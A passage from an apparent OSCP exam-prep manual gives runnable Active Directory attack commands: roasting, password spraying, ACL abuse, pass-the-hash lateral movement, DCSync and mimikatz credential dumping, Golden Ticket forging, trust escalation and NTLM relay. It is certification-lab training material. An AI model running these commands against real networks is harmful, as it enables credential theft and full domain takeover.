> Any authenticated user can request a service ticket for an SPN account; it's encrypted with that account's password hash, so you crack it offline (`-m 13100`). If `GetUserSPNs` errors on clock skew, sync time: `sudo ntpdate $IP` (or `rdate`). See [§7.6](#76--rubeus--bloodyad-driving-the-two-tools-this-manual-leans-on) for driving Rubeus in depth.

### AS-REP Roasting

`TRIGGER:` accounts with "Do not require Kerberos preauthentication." You don't even need creds — just a username list.

Roast without credentials:
```bash
impacket-GetNPUsers corp.com/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
```
Roast a known user:
```bash
impacket-GetNPUsers corp.com/santi -dc-ip $IP -no-pass
```
Crack the result:
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
On a Windows foothold (Rubeus):
```cmd
.\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash
```

> [!note]
> Accounts without preauth hand out an encrypted blob to *anyone* who asks, cracked offline (`-m 18200`). This is why the `kerbrute` user list from 7.0 is so useful — feed it straight in.

### Password spraying

`TRIGGER:` a valid user list + one guessable/known password. **Check the lockout policy first** (`--pass-pol` / `getdompwinfo`).

Spray over SMB (only hits shown):
```bash
crackmapexec smb $IP -u users.txt -p 'Season2025!' --continue-on-success | grep +
```
Spray with kerbrute (Kerberos pre-auth, quieter):
```bash
kerbrute passwordspray -d corp.com --dc $IP users.txt 'Season2025!'
```
Single-attempt local-auth spray across a subnet (avoid domain lockout):
```bash
crackmapexec smb 10.10.10.0/24 --local-auth -u administrator -H <NTLM> | grep +
```

> [!note]
> Spray *one* password across *many* users (not many passwords against one user) to avoid lockouts. Seasonal/company-name passwords land more than you'd expect. The `--local-auth` + hash form is the safe way to test local-admin reuse without touching domain lockout counters.

### ACL / DACL abuse

`TRIGGER:` BloodHound shows an edge (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember) from something you own.

Force-change a target user's password (ForceChangePassword edge):
```bash
net rpc password "targetuser" "NewPass123!" -U corp.com/user%pass -S $IP
```
Add yourself to a group (AddMember edge):
```bash
net group "Target Group" user /add /domain
```

> [!example] PowerView ACL abuse on a Windows foothold
> Build a credential object, then abuse the edge in-session:
> ```powershell
> $sp = ConvertTo-SecureString 'pass' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential('CORP\user',$sp)
> # ForceChangePassword:
> Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'New123!' -AsPlainText -Force) -Credential $cred
> # AddMember:
> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members victim -Credential $cred
> # Targeted Kerberoast via GenericWrite (set a fake SPN, roast, clear it):
> Set-DomainObject -Identity victim -SET @{serviceprincipalname='fake/SPN'} -Credential $cred
> # Grant yourself DCSync via WriteDacl on the domain object:
> Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity user -Rights DCSync -Credential $cred
> ```

**Windows rights & privileges decoder — see it → do this:**

| Right / privilege | Meaning → what you do |
|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | Impersonate a token → **Potato → SYSTEM** ([§6.1](#61--token-abuse-the-potato-family)) |
| **SeBackup / SeRestore** | Read any file → copy SAM+SYSTEM (or NTDS) → secretsdump offline |
| **SeDebug** | Access any process → dump LSASS for creds |
| **SeLoadDriver** | Load a vulnerable driver → kernel-level SYSTEM |
| **SeTakeOwnership** | Take ownership of a file/key → grant yourself write → modify |
| **GenericAll (user)** | Full control → reset their password, or set a fake SPN and Kerberoast |
| **GenericAll (group)** | Add yourself to the group (`net group ... /add /domain`) |
| **GenericAll (computer)** | RBCD / read LAPS / shadow-credentials attack |
| **GenericWrite (user)** | Set an SPN (targeted Kerberoast) or a logon script |
| **WriteDACL** | Grant yourself more rights on the object — e.g. add **DCSync** rights on the domain |
| **WriteOwner** | Become owner → then WriteDACL → full control |
| **ForceChangePassword** | Reset the target's password without knowing the old one |
| **AddMember** | Add an account to a group |
| **ReadLAPSPassword / ReadGMSAPassword** | Read the managed local-admin / gMSA password directly |
| **DnsAdmins membership** | Load a malicious DLL into the DNS service (`dnscmd /serverlevelplugindll`) → SYSTEM on the DC |
| **Backup Operators membership** | Gains SeBackup/SeRestore → read hives / NTDS |
| **Exchange Windows Permissions** | Often WriteDACL on the domain → grant self DCSync |

> [!note]
> BloodHound draws these as edges from your owned node — the table maps each to the impacket/PowerView/bloodyAD action that unlocks it. `bloodyAD` and PowerView are the general-purpose tools. **Highest-value chain:** WriteDACL on the domain → grant `DS-Replication-Get-Changes-All` → DCSync ([§7.3](#73--credential-access--domain-compromise)).

## 7.2 — Lateral Movement

`TRIGGER:` you have creds or a hash for an account that is local admin somewhere (BloodHound "AdminTo"/"CanRDP"). Pick the execution method the box allows.

Test admin + run a command across hosts:
```bash
crackmapexec smb $IP -u user -H <NTLM> -x 'whoami'
```
SYSTEM shell via psexec (noisy — drops a service):
```bash
impacket-psexec corp.com/user@$IP -hashes :<NTLM>
```
Quieter, semi-interactive via wmiexec:
```bash
impacket-wmiexec corp.com/user@$IP -hashes :<NTLM>
```
Via the ADMIN$ share with a plaintext password:
```bash
impacket-psexec corp.com/user:'pass'@$IP
```
WinRM shell with a hash:
```bash
evil-winrm -i $IP -u user -H <NTLM>
```
PowerShell remoting from a Windows foothold:
```powershell
$sp = ConvertTo-SecureString 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\user',$sp)
Enter-PSSession -ComputerName TARGET -Credential $cred
```

> [!note]
> - **Pass-the-Hash:** `-hashes :<NTLM>` / `-H <NTLM>` authenticates with the hash directly — no plaintext needed. That's why dumping hashes (7.3) unlocks lateral movement.
> - psexec is reliable but loud; wmiexec is quieter; evil-winrm needs WinRM (5985). Use CME first to find *which* hosts the credential is admin on, then pick a shell method.
> - Kerberos variants (overpass-the-hash, pass-the-ticket) are the fallback when NTLM auth is blocked but Kerberos is allowed — drive them with Rubeus ([§7.6](#76--rubeus--bloodyad-driving-the-two-tools-this-manual-leans-on)).

## 7.3 — Credential Access & Domain Compromise

`TRIGGER:` local or domain admin on a host — now harvest more credentials and pivot toward the DC.

Dump SAM/LSA/cached creds on a host:
```bash
impacket-secretsdump corp.com/user@$IP -hashes :<NTLM>
```
DCSync a single high-value account (needs DA / GetChangesAll):
```bash
impacket-secretsdump corp.com/DAuser:'pass'@<DC-IP> -just-dc-user Administrator
```
DCSync everything, including `krbtgt` (for Golden Tickets):
```bash
impacket-secretsdump corp.com/DAuser:'pass'@<DC-IP> -just-dc
```

> [!example] mimikatz equivalents (on a Windows host with admin)
> ```
> privilege::debug
> sekurlsa::logonpasswords          :: creds/hashes from LSASS memory
> lsadump::sam                       :: local SAM hashes
> lsadump::dcsync /domain:corp.local /user:Administrator   :: DCSync one user
> lsadump::dcsync /domain:corp.local /user:krbtgt          :: krbtgt for Golden Ticket
> ```
> If mimikatz throws a key-import error, use the older `mimikatz_trunk` build ([§9.2](#92--reference-sites-bookmark--offline-copies-where-possible)).

> [!note]
> - `secretsdump` on a compromised host pulls local hashes and cached domain creds — run it even on non-DCs, because a box a Domain Admin logged into may cache their creds.
> - **DCSync** abuses the replication right (`GetChangesAll`) to ask the DC for a user's hash *as if* you were another DC — no code runs on the DC. `-just-dc-user Administrator` pulls the DA hash; `-just-dc` pulls everything including `krbtgt`.
> - Administrator hash from the DC = **domain owned**: pass-the-hash into the DC (7.2), grab `proof.txt`.

### Shadow Copies — reading NTDS.dit on the DC

`TRIGGER:` you're admin on the DC but want the whole AD database and direct LSASS access is guarded.

> [!note]
> A Volume Shadow Copy is a point-in-time snapshot of the disk; because it's a *copy*, you can read the normally-locked `NTDS.dit` (the AD database of every hash) and the SYSTEM hive out of it, then extract every domain hash offline with `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`. The built-in `vssadmin`/`ntdsutil`/`diskshadow` tools create the snapshot — standard, documented DC-admin methodology (HackTricks, [§9.2](#92--reference-sites-bookmark--offline-copies-where-possible)). The trigger and the *why* are the parts worth memorizing.

## 7.4 — Kerberos ticket forging (Golden / Silver)

> [!warning]
> On OSCP these are usually for **persistence or crossing a trust after you already own the domain**, not the primary path. Know what each requires and when it helps.

**Golden Ticket** — `TRIGGER:` you have the **krbtgt** account's hash (from DCSync/NTDS). Because krbtgt signs *all* Kerberos tickets, its hash forges a valid ticket for any user — a domain-wide master key until krbtgt is rotated twice.

Forge + inject with impacket (needs domain SID):
```bash
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <S-1-5-21-...> -domain corp.com Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.com/Administrator@<DC> -k -no-pass
```

**Silver Ticket** — `TRIGGER:` you have a *service* account's hash (or a machine account hash). It forges a ticket for that *one* service on that *one* host — narrower, but stealthier because it never contacts the DC.

> [!example] mimikatz Golden Ticket (Windows)
> ```
> kerberos::golden /user:Administrator /domain:corp.local /sid:<domain-SID> /krbtgt:<krbtgt-hash> /ptt
> ```
> (`Rubeus.exe golden /rc4:<krbtgt-hash> /domain:corp.local /sid:<SID> /user:Administrator /ptt` is the Rubeus form.)

> [!note]
> Both are forged with `impacket-ticketer` (or mimikatz/Rubeus) and need the domain SID plus the relevant hash. They're escalation/persistence tools you reach for *after* a compromise, not a way in — which is why they sit at the end of the AD chain.

## 7.4.1 — Domain trusts (child → parent, cross-forest)

`TRIGGER:` `Get-DomainTrust` / `nltest` shows a trust, and you own a child domain but need the parent (or a trusting forest).

Enumerate trusts:
```powershell
Get-DomainTrust            # PowerView
Get-DomainTrustMapping     # map everything reachable
```
Automated child→parent escalation with impacket (uses the SID-history trick):
```bash
impacket-raiseChild corp.local/childadmin:'pass'@<child-DC>
```

> [!note]
> The classic child→parent attack builds a Golden Ticket in the child domain with an **extra SID** for the parent's Enterprise Admins group (SID history), because the trust doesn't filter it. `raiseChild` automates the whole chain; the manual path is DCSync the child's krbtgt → `ticketer` with `-extra-sid <parent-EA-SID>` → psexec the parent DC. Cross-forest trusts can be abused similarly when SID filtering is off, or by Kerberoasting *across* the trust (`GetUserSPNs -target-domain`).

## 7.5 — Ordered attack checklist ("if you have X, do Y")

- [ ] DC IP only → `kerbrute userenum`
- [ ] **Got usernames → AS-REP roast** (no creds needed)
- [ ] Got 1 credential → check `--pass-pol` **then** spray → BloodHound (mark owned) → Kerberoast
- [ ] Got a hash → PtH lateral; crack offline
- [ ] Got local admin on a host → `secretsdump`; hunt cached DA (`--loggedon-users`)
- [ ] Got a dangerous ACL edge → rights decoder ([§7.1](#71--credential-attacks))
- [ ] Got DA / GetChangesAll → **DCSync** Administrator + krbtgt
- [ ] Got krbtgt → Golden Ticket (persistence / cross-trust)
- [ ] Child domain owned, need parent → `raiseChild` / SID-history Golden Ticket

→ Administrator hash from the DC = **domain owned.** PtH into the DC ([§7.2](#72--lateral-movement)), grab `proof.txt`.

## 7.6 — Rubeus & BloodyAD (driving the two tools this manual leans on)

The AD sections above name-drop `Rubeus` and `bloodyAD`; here's how to actually drive them, when each one wins, and a worked OSCP-level chain for both.

### Rubeus — on-host Kerberos abuse (Windows, C#)

> [!tip] Specialty & when to use
> Rubeus is your **Kerberos multitool for when you already have a shell on a domain-joined Windows box.** It does everything ticket-related in memory — Kerberoast, AS-REP roast, request a TGT from a hash (overpass-the-hash), pass-the-ticket, and harvest tickets other users left in memory. Reach for it *instead of* impacket when you're standing on a Windows foothold and want to stay on-host; reach for impacket's `GetUserSPNs`/`GetNPUsers` ([§7.1](#71--credential-attacks)) when you're operating **remotely from Kali** with creds. Same attacks, different vantage point.

**Getting a binary (it's C#, so it needs building):** precompiled is simplest and exam-legal — grab `Rubeus.exe` from the SharpCollection repo, or build it once yourself in Visual Studio (open `Rubeus.sln` → set **Release / x64** → Build). Command-line build if you have the toolchain:
```cmd
msbuild Rubeus.sln /p:Configuration=Release
```

> [!note]
> Match the target's .NET: older Windows may only have .NET 3.5/4.0, so retarget the project framework if `Rubeus.exe` won't launch. Transfer it with evil-winrm `upload` ([§2.1](#rdp-3389--winrm-5985--vnc-5900-creds-in-hand-services)) or any [§11](#111--file-transfer--which-method-when) method, then run it from your shell. To run it **in memory** from evil-winrm, launch with `-e <dir>` and use `Invoke-Binary Rubeus.exe <args>`.

Kerberoast every SPN account to a hashcat-ready file:
```cmd
Rubeus.exe kerberoast /outfile:kerb.hash
```
AS-REP roast accounts without preauth:
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
```
Overpass-the-hash — turn an NTLM hash into a usable TGT and inject it into this session:
```cmd
Rubeus.exe asktgt /user:svc_sql /rc4:<NTLM> /ptt
```
Pass-the-ticket — inject a `.kirbi`/base64 ticket you already have:
```cmd
Rubeus.exe ptt /ticket:<base64-or-path.kirbi>
```
Harvest tickets sitting in memory (find a DA's TGT on a shared host):
```cmd
Rubeus.exe triage
```

> [!note] OSCP-level chain
> You land on a Windows box as a service account and pull its NTLM from the SAM ([§6.4](#64--privilege-specific-escalations-the-whoami-priv-decoder)). Instead of dragging the hash back to Kali, run `Rubeus.exe asktgt /user:svc_sql /rc4:<NTLM> /ptt` — now this shell holds `svc_sql`'s Kerberos TGT, so `dir \\dc01\c$` or a follow-up `Rubeus.exe kerberoast` runs *as that account* with no plaintext. Crack any roast output back on Kali with `hashcat -m 13100` ([§2.3](#23--credential-enumeration)).

### BloodyAD — remote ACL/DACL abuse (from Kali, Python)

> [!tip] Specialty & when to use
> BloodyAD is your **"BloodHound showed me an ACL edge, now execute it" tool, run remotely from Kali.** Its specialty is turning a directory-object write right (`GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`, `AddMember`) into a concrete action over LDAP — reset a password, add yourself to a group, grant yourself DCSync, set a fake SPN. It's the from-Kali counterpart to on-host PowerView, with one consistent syntax. Use it the moment [§7.1](#71--credential-attacks)'s rights decoder points at an edge you hold.

**Install (no compilation — it's Python):**
```bash
pipx install bloodyAD
```

> [!note]
> Auth works with a password, an NTLM hash (pass-the-hash), or Kerberos. The base invocation is always `bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> <action>`; swap `-p 'pass'` for `-p :<NTLM>` to use a hash, or add `-k` for Kerberos.

See exactly which objects you're allowed to write (always start here):
```bash
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> get writable
```
Force-change a target's password (GenericAll / ForceChangePassword edge):
```bash
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> set password targetuser 'NewPass123!'
```
Add yourself to a privileged group (AddMember / GenericAll on the group):
```bash
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> add groupMember "Target Group" youruser
```
Grant yourself DCSync rights (WriteDACL on the domain object):
```bash
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> add dcsync youruser
```

> [!note] OSCP-level chain
> BloodHound shows `youruser —WriteDACL→ DOMAIN`. Run `bloodyAD ... add dcsync youruser` to grant yourself replication rights, then dump the domain from Kali: `impacket-secretsdump -just-dc corp.com/youruser:'pass'@<DC-IP>` ([§7.3](#73--credential-access--domain-compromise)) → Administrator + krbtgt hashes → pass-the-hash into the DC ([§7.2](#72--lateral-movement)). A full `WriteDACL → domain owned` chain in two commands.

## 7.7 — Responder / NTLM relay (`[BANNED-EXAM]` — lab & practice only)

> [!danger] Not for the exam
> Active poisoning/spoofing is an **automatic-fail** on OSCP ([§0.1](#01--tool-restrictions--read-this-it-cost-you-before)). This subsection exists because it's core AD *practice* methodology (HTB/PG/labs) and you'll use it constantly outside the exam. **Never run these on the exam.**

Capture NetNTLMv2 by answering LLMNR/NBT-NS (lab):
```bash
sudo responder -I eth0 -wv
```
Crack the captured hash:
```bash
hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```
Relay instead of crack, when SMB signing is off (lab):
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

> [!note]
> Responder listens for name-resolution queries and answers them so victims authenticate to *you*, yielding a crackable NetNTLMv2 hash. `ntlmrelayx` forwards that auth to another host (SMB signing must be disabled) for code execution or hash dumping. The Windows-side analog is `Inveigh`. Great skills — just not exam-legal.

---
# 8 — Post-Exploitation

**Scope.** After compromise: loot, reuse, expand. On OSCP this is mostly the connective tissue of the AD set — it's what turns one owned box into the next.

- **Loot as the new privileged user** ([§2.4](#24--file--share-enumeration) sweep): cred stores, config files, command histories, KeePass DBs, browser creds. On Windows, check PowerShell history (`Get-History`, and on-disk `ConsoleHost_history.txt`).
- **Reuse every credential** — feed each new secret back into [§2.3](#23--credential-enumeration) spray and [§7](#7--active-directory-attacks) lateral movement. This feedback loop is how the AD chain actually unlocks.
- **Dump host creds** ([§7.3](#73--credential-access--domain-compromise)) even on non-DCs — a cached Domain Admin logon on an ordinary box is an instant path to the domain.
- **Enumerate the domain from the new host** if it can see the DC and your Kali can't (run SharpHound locally, exfil the zip).
- **Map the next hop** — new subnets/hosts visible only from this box mean it's time to pivot ([§11](#112--port-forwarding--tunneling--when-to-use-which)); then recurse to [§1](#1--methodology-master-decision-flow) for the hidden network.
- **Persistence (light only):** just note a working credential/hash so a dropped shell isn't fatal. No advanced persistence is needed or wanted for OSCP.
- **Cleanup:** per exam rules, remove tools/files you dropped once the objective is met.

---

# 9 — Wordlists, Payloads & Resources

**Scope.** Wordlists, payloads, and reference sites. On Kali most live under `/usr/share/`. These are reference lists — grouped on purpose.

## 9.0 — On-disk wordlists

```
# Passwords
/usr/share/wordlists/rockyou.txt                     # THE list — gunzip rockyou.txt.gz first
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
/usr/share/seclists/Passwords/Common-Credentials/best110.txt          # quick spray
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt

# Web content / directories / files
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  # default dir list
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt        # files not dirs
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt                   # quick pass
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirb/big.txt

# Subdomains / DNS / vhosts
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Usernames
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Parameters / injection payloads
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# SNMP community strings
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

> [!note]
> If SecLists isn't installed: `sudo apt install seclists` or clone `github.com/danielmiessler/SecLists`. `rockyou` is your default cracking list; the top-1000 / best110 lists are for fast spraying where you don't want to burn time.

## 9.1 — Custom wordlist generation

`TRIGGER:` a target-specific vocabulary would beat a generic list (company terms, product names on the site).

Scrape site words into a candidate list:
```bash
cewl -d 2 -m 5 -w custom.txt http://$IP
```
Scrape with numbers included (min length via `-d`):
```bash
cewl http://$IP -d 4 --with-numbers -w cewlpasswords.txt
```

> [!note]
> `-d 2` crawls two links deep, `-m 5` keeps words ≥5 chars. Feed the result to hashcat with a rule (`-r best64.rule`) to cover capitalization and `!`/number suffixes. For AD username formats, generate permutations (`first`, `flast`, `f.last`, `firstl`) from real names — `username-anarchy` automates it.

## 9.2 — Reference sites (bookmark — offline copies where possible)

- **GTFOBins** — Linux SUID/sudo/capability escapes: https://gtfobins.github.io
- **LOLBAS** — Windows living-off-the-land binaries: https://lolbas-project.github.io
- **WADComs** — Windows/AD command lookup by context: https://wadcoms.github.io
- **PayloadsAllTheThings** — payloads for every vuln class: https://github.com/swisskyrepo/PayloadsAllTheThings
- **revshells.com** — reverse shell generator/encoder: https://www.revshells.com
- **HackTricks** — methodology per port/service/technique: https://book.hacktricks.xyz
- **The Hacker Recipes** — AD-focused technique reference: https://www.thehacker.recipes
- **PEASS-ng (linpeas/winpeas)** — https://github.com/carlospolop/PEASS-ng
- **Impacket** — https://github.com/fortra/impacket
- **BloodHound docs / Cypher** — https://bloodhound.readthedocs.io (+ search "hausec cypher cheatsheet")
- **hashcat example hashes** (mode lookup): https://hashcat.net/wiki/doku.php?id=example_hashes
- **Report templates** — OffSec official; whoisflynn: https://github.com/whoisflynn/OSCP-Exam-Report-Template ; CPTC examples: https://github.com/nationalcptc/report_examples

---

# 10 — Tools, Setup & Command Reference

## 10.0 — Tool map by phase

| Phase | Tools |
|---|---|
| Port/host scan | `nmap`, `rustscan`, `masscan`, `autorecon` |
| Web enum | `feroxbuster`, `gobuster`, `ffuf`, `whatweb`, `wpscan`, `nikto`, Burp **Free** |
| SMB/AD enum | `crackmapexec`/`netexec`, `enum4linux-ng`, `smbclient`, `smbmap`, `rpcclient`, `ldapsearch`, `bloodhound-python`, `kerbrute`, `Snaffler`, `adidnsdump` |
| Cred attacks | `hydra`, `hashcat`, `john`, `impacket-GetUserSPNs`, `impacket-GetNPUsers` |
| Exploitation | `searchsploit`, `msfvenom`, `metasploit` `[MSF-1]`, `impacket-*` |
| Linux privesc | `linpeas.sh`, `lse.sh`, `pspy`, `getcap`, GTFOBins |
| Windows privesc | `winPEAS`, `PowerUp.ps1`, `Seatbelt`, `accesschk`, `GodPotato`, `PrintSpoofer`, `JuicyPotatoNG` |
| AD attack | Impacket suite, `Rubeus`, `mimikatz`, `evil-winrm`, `bloodyAD`, `PowerView` |
| Pivoting/transfer | `chisel`, `ligolo-ng`, `proxychains`, `socat`, `sshuttle` |

## 10.0.1 — Capability reference: tools for Linux targets

Use this to stay on track: *which* tool, *what* it does, *when* you reach for it. Grouped by phase.

| Category | Tool | What it does | When you'd use it |
|---|---|---|---|
| Cred attacks | `hydra` | Online brute/spray of network logins (SSH, FTP, HTTP forms, RDP) | You have a login interface + user/pass lists ([§2.3](#23--credential-enumeration)) |
| Cred attacks | `hashcat` | GPU offline hash cracking, every mode | You recovered a hash and have a GPU |
| Cred attacks | `john` | CPU offline cracking + `*2john` converters | No GPU, or odd formats (`ssh2john`, `zip2john`, `keepass2john`) |
| Exploitation | `searchsploit` | Local Exploit-DB search/mirror/read | You have a service **version** string ([§3.5](#35--known-cve-triage)) |
| Exploitation | `msfvenom` | Payload/shell generator (exam-legal) | Need a reverse/bind ELF or PHP payload ([§4.1](#41--msfvenom-payloads-exam-ok--venom-is-exempt)) |
| Exploitation | `nc` / `socat` | Listeners + port relays | Catch shells; relay a port through a pivot |
| Privesc | `linpeas.sh` | Automated, colour-coded Linux privesc enum | **First thing** on any Linux shell ([§5.0](#50--automated-enumeration)) |
| Privesc | `lse.sh` | Quieter linux-smart-enumeration | linpeas fallback / less output to wade through |
| Privesc | `pspy` | Watch processes + cron live, no root needed | Catch a hidden root cron job ([§5.1](#51--manual-quick-wins-enumerate--exploit)) |
| Privesc | `getcap` | List file capabilities | Hunt `cap_setuid`/`cap_dac_*` on interpreters |
| Privesc | GTFOBins *(ref)* | SUID/sudo/capability escape lookups | Map any allowed binary → a root shell |

## 10.0.2 — Capability reference: tools for Windows / AD targets

| Category | Tool | What it does | When you'd use it |
|---|---|---|---|
| Cred attacks | `crackmapexec`/`netexec` | Swiss-army over SMB/WinRM/MSSQL: spray, PtH, dump SAM/LSA, enumerate | Spray found creds across a subnet; test where you're admin ([§2.3](#23--credential-enumeration)) |
| Cred attacks | `impacket-secretsdump` | Dump SAM/LSA/cached/NTDS hashes | After local or domain admin on a host ([§7.3](#73--credential-access--domain-compromise)) |
| Cred attacks | `responder` | LLMNR/NBT-NS poisoning → capture NetNTLM `[BANNED-EXAM]` | Grab hashes on the wire (**lab/practice only**) |
| Cred attacks | `hashcat` / `john` | Crack NTLM / Kerberoast / AS-REP offline | Any recovered Windows/Kerberos hash ([§2.3](#23--credential-enumeration)) |
| Exploitation | `impacket-psexec`/`wmiexec`/`smbexec` | Remote command exec / shell with creds or hash | Get a shell on a Windows host you're admin on ([§7.2](#72--lateral-movement)) |
| Exploitation | `evil-winrm` | Interactive WinRM shell (creds or PtH), in-memory tool loading | Port 5985 open + a Windows credential ([§2.1](#rdp-3389--winrm-5985--vnc-5900-creds-in-hand-services)) |
| Exploitation | `msfvenom` | exe / dll / msi payloads (exam-legal) | Service-binary / DLL-hijack / MSI privesc payloads ([§6](#6--privilege-escalation-windows)) |
| Exploitation | `searchsploit` | version → public exploit | After fingerprinting a Windows service ([§3.5](#35--known-cve-triage)) |
| Privesc | `winPEAS` | Automated Windows privesc enum | **First thing** on any Windows shell ([§6.0](#60--first-commands-always)) |
| Privesc | `PowerUp.ps1` | Service/registry misconfig checks (+ auto-abuse) | Targeted service/registry privesc ([§6.2](#62--service-misconfigurations)) |
| Privesc | `Seatbelt` | Broad host survey | Supplement winPEAS with host context |
| Privesc | `accesschk` | ACL checks — "can I write this?" | Confirm service/binary/file write rights ([§6.2](#62--service-misconfigurations)) |
| Privesc | GodPotato / PrintSpoofer / JuicyPotatoNG | Abuse `SeImpersonate` → SYSTEM | `whoami /priv` shows an impersonate token ([§6.1](#61--token-abuse-the-potato-family)) |
| AD attacks | `bloodhound-python` / `SharpHound` | Collect the AD graph | Map the path to Domain Admin ([§7.0](#70--ad-enumeration)) |
| AD attacks | BloodHound GUI | Analyze/visualize paths + ACL edges | Find the chain, mark owned nodes ([§7.0.1](#701--bloodhound--cypher-the-simple-queries-you-keep-needing)) |
| AD attacks | `impacket-GetUserSPNs` / `GetNPUsers` | Kerberoast / AS-REP roast **from Kali** | Remote roasting with (or without) creds ([§7.1](#71--credential-attacks)) |
| AD attacks | `Rubeus` | On-host Kerberos: roast, asktgt/OPtH, PtT, ticket harvest | Operating from a Windows foothold ([§7.6](#76--rubeus--bloodyad-driving-the-two-tools-this-manual-leans-on)) |
| AD attacks | `bloodyAD` / `PowerView` | Execute an ACL-edge abuse (remote / on-host) | Turn a BloodHound edge into action ([§7.1](#71--credential-attacks), [§7.6](#76--rubeus--bloodyad-driving-the-two-tools-this-manual-leans-on)) |
| AD attacks | `Snaffler` | Hunt creds across readable shares | On a Windows foothold, surface passwords fast ([§7.0](#70--ad-enumeration)) |
| AD attacks | `mimikatz` | Dump LSASS creds/tickets, DCSync, pass-the-ticket | On a Windows host with admin ([§7.3](#73--credential-access--domain-compromise)) |
| AD attacks | `impacket-secretsdump -just-dc` | DCSync the domain's hashes | You hold DA / `GetChangesAll` ([§7.3](#73--credential-access--domain-compromise)) |

## 10.1 — High-frequency one-liners

Serve files to a victim (transfer, [§11](#111--file-transfer--which-method-when)):
```bash
python3 -m http.server 80
```
Stand up an SMB server for Windows transfers:
```bash
impacket-smbserver share . -smb2support
```
Start a listener with history/arrow keys:
```bash
rlwrap nc -lvnp 443
```
Base64 a file for copy-paste transfer (no network drop needed):
```bash
base64 -w0 file    # encode on source; `base64 -d` on the other side
```

> [!note]
> The first two are your constant companions — one HTTP and one SMB drop point. Which you use depends on the victim's egress ([§11](#111--file-transfer--which-method-when)). `-smb2support` is required for modern Windows to talk to the impacket server.

## 10.2 — Setup: Python venv & pipx (PEP 668 workaround)

Kali enforces PEP 668, so a bare `pip install <pkg>` fails system-wide. Use a **venv** for project/PoC dependencies and **pipx** for standalone CLI tools. Useful for GitHub PoCs, version-pinned tooling (e.g. `impacket-0.11` vs `0.12`), and clean-slate hygiene between clients.

Install the prerequisites:
```bash
sudo apt install -y python3-venv python3-pip pipx
```
Create a project dir and a venv inside it:
```bash
mkdir -p ~/tools/proj && cd ~/tools/proj && python3 -m venv .venv
```
Activate it (modifies the current shell; a subshell would lose it on exit):
```bash
source .venv/bin/activate
```
Install a PoC's dependencies (often shipped alongside it):
```bash
pip install -r requirements.txt
```
Restore your `$PATH` and drop the prompt prefix when done:
```bash
deactivate
```
For standalone CLI tools, pipx makes a hidden per-tool venv and puts the entry point on your `$PATH`:
```bash
pipx install impacket
```
```bash
pipx install netexec
```
```bash
pipx install bloodyAD
```

## 10.3 — Setup: BloodHound CE (the one that trips people up)

BloodHound CE runs in Docker. Set it up once before the exam so you're not fighting it live.

Fetch the official compose file:
```bash
curl -L https://ghst.ly/getbhce -o docker-compose.yml
```
Bring it up:
```bash
docker compose up -d
```
Grab the randomly-generated admin password from the logs:
```bash
docker compose logs | grep -i "Initial Password"
```

> [!note]
> - Browse to `http://localhost:8080` and log in as `admin` with that password.
> - Collect data with `bloodhound-python` ([§7.0](#70--ad-enumeration)) and drag the resulting `.zip` onto the UI to ingest.
> - Mark owned nodes and run the analytics from [§7.0.1](#701--bloodhound--cypher-the-simple-queries-you-keep-needing).
> - Legacy neo4j BloodHound: `sudo neo4j start`, browse `http://localhost:7474` to set the password, then launch `bloodhound` and connect to `bolt://localhost:7687`.

## 10.4 — Setup: proxychains & reusable listeners

Point proxychains at your SOCKS proxy (do this before you pivot):
```bash
sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
```

> [!warning]
> - The port must match your tunnel: chisel and `ssh -D` use `1080` in this manual; some setups default to `9050`. **Verify it** or every proxied command silently fails.
> - Also uncomment `dynamic_chain` in that file so a dead proxy doesn't kill the whole chain.
> - Keep a `/opt/tools` directory pre-stocked with transfer-ready binaries (linpeas, winpeas, the Potatoes, SharpHound, Rubeus, chisel, ligolo, mimikatz, PowerView, nc.exe) so you're not hunting for them mid-exam. Serve them with the [§10.1](#101--high-frequency-one-liners) HTTP one-liner.

---

# 11 — Networking, Pivoting & Data Transfer

**Scope.** The plumbing that eats exam time if fumbled. This burned you last attempt — so the focus is *when* to use each technique, tied to the network architecture, not just how.

## 11.0 — Shell stabilization

`TRIGGER:` a dumb `nc` shell (no tab-complete, Ctrl-C kills the whole shell). Upgrade it in three steps.

Spawn a PTY:
```bash
